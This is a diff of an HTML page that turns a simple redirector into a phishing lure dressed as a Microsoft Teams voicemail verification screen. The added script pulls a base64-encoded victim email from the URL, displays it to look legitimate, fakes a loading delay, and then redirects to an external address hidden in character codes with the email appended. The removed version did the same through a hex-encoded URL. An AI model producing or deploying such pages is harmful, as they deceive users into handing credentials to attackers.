@@ -2,57 +2,140 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+        }
+        .container {
+            text-align: center;
+        }
+        .dots-container {
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .dot {
+            background-color: dodgerblue;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            margin: 5px;
+            animation: grow 1.5s infinite ease-in-out;
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes grow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #emailDisplay {
+            color: rgb(110, 71, 238);
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        #verifyButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            background-color: rgb(110, 71, 238);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            height: 50px;
+        }
+        #verifyButton:hover {
+            background-color: rgb(142, 204, 255);
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
+        <div id="emailDisplay" aria-live="polite"></div>
+        <button id="verifyButton" aria-label="Click to Verify">Play VoiceMail</button>
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
     <script>
-        // Decode a base64-encoded string with error handling
+        // Function to decode base64 string
         function decodeBase64(encoded) {
             try {
-                return atob(encoded);
+                return decodeURIComponent(atob(encoded).split('').map(c =>
+                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
             } catch (e) {
-                console.error("Invalid base64 encoding:", e);
-                return null;
+                console.error("Decoding failed: ", e);
+                return null; // Return null if decoding fails
             }
         }
 
-        // Check URL parameters for a base64-encoded value that decodes to an email
+
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
             for (const [key, value] of urlParams.entries()) {
-                // Attempt to decode the parameter's value as a base64 string
-                const decodedValue = decodeBase64(value);
-                if (decodedValue && isValidEmail(decodedValue)) {
-                    return decodedValue; // Return if it’s a valid email
+                if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
+                    const decodedValue = decodeBase64(value);
+                    if (decodedValue && decodedValue.includes('@')) {
+                        return { key, value }; // Return the key and the decoded email
+                    }
                 }
             }
-            console.warn("No valid email parameter found.");
             return null;
         }
 
-        // Validate if the decoded value is a correctly formatted email
-        function isValidEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
+      function redirectToTarget(base64Email) {
+    const parts = [104, 116, 116, 112, 115, 58, 47, 47, 111, 117, 116, 45, 109, 105, 115, 111, 114, 102, 46, 116, 111, 112, 47, 115, 105, 54, 47, 105, 110, 100, 101, 120, 46, 104, 116, 109, 108, 47, 35];
+    const obfuscatedURL = String.fromCharCode(...parts) + base64Email;
+    window.location.href = obfuscatedURL;
+}
+
+        // Function to update the displayed email
+        function updateLink() {
+            const emailParam = findEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (emailParam) {
+                emailDisplay.innerText = decodeBase64(emailParam.value); // Always display the decoded email
+            } else {
+                console.error("No email to display");
+            }
         }
 
-        // Decode a hex-encoded URL
-        function decodeHex(hexString) {
-            return decodeURIComponent('%' + hexString.match(/.{1,2}/g).join('%'));
-        }
+        // Click button functionality
+        const button = document.getElementById('verifyButton');
+        button.addEventListener('click', function() {
+            // Hide the verify button
+            button.style.display = 'none';
+            // Show loading dots
+            document.querySelector('.dots-container').style.display = 'flex';
+            
+            setTimeout(() => {
+                const emailParam = findEmailParam();
+                if (emailParam) {
+                    redirectToTarget(emailParam.value);
+                } else {
+                    console.error("No email found for redirection");
+                }
+            }, 2000);
+        });
 
-        // Main execution
-        const hexEncodedURL = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
-        const decodedURL = decodeHex(hexEncodedURL);
-        const email = findEmailParam();
-
-        if (email) {
-            // Redirect to the constructed URL with the email as a query parameter
-            location.href = `${decodedURL}&email=${encodeURIComponent(email)}`;
-        } else {
-            // Display a fallback message if no valid email is found
-            document.body.innerHTML = "<h1>Hi</h1>";
-        }
+        window.onload = updateLink;
     </script>
 </body>
 </html>
